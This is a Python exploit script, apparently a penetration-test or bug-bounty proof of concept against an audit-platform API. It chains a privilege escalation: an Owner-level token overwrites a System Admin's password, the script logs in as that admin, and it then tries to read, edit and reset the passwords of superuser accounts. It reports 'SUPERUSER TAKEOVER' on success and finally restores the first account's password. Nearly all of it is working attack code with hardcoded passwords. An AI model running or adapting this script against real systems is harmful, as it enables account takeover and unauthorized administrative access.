import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
PW="Zx9!chain47"
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or T),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
def login(email,pw):
    cmd=['curl','-s','-m','30','-o','/tmp/l','-w','%{http_code}','-X','POST',H+'/api/v1/users/login',
         '-H',BB,'-H','Content-Type: application/json','-d',json.dumps({"credentials":{"email":email,"password":pw}})]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/l',encoding='utf-8',errors='replace').read()
UID=53; EMAIL="steve@u1elhxrx.mailosaur.net"
print("STEP 1: Owner(231) -> System Admin(53) password write")
c,b=req('PUT',f'/api/v1/users/{UID}',{"user":{"password":PW}})
print("  PUT ->",c)
req('PUT',f'/api/v1/users/{UID}',{"user":{"requires_password_change":False}})
c,b=login(EMAIL,PW)
print("  login ->",c)
if c!='200': raise SystemExit("chain broke at login")
s=json.loads(b)['session']; RT=s['token']
print(f"  token as: {s['email']} role={s['role_id']}")
print("\nSTEP 2: does role-2 token reach Superuser (role 1)?")
for uid in [1,168]:
    c,b=req('GET',f'/api/v1/users/{uid}',tok=RT)
    print(f"  GET /users/{uid} -> {c}")
    c,b=req('PUT',f'/api/v1/users/{uid}',{"user":{"job_title":"zx-probe"}},tok=RT)
    print(f"  PUT job_title /users/{uid} -> {c} {b[:110].replace(chr(10),' ')}")
    c,b=req('PUT',f'/api/v1/users/{uid}',{"user":{"password":"Zx9!su-chain"}},tok=RT)
    print(f"  PUT password  /users/{uid} -> {c} {b[:110].replace(chr(10),' ')}")
    if c=='200':
        print("  *** SUPERUSER TAKEOVER ***")
print("\nSTEP 3: restore 53")
c,b=req('PUT',f'/api/v1/users/{UID}',{"user":{"password":"Tester"}})
print("  restore ->",c)
c,b=login(EMAIL,"Tester")
print("  login with Tester ->",c)
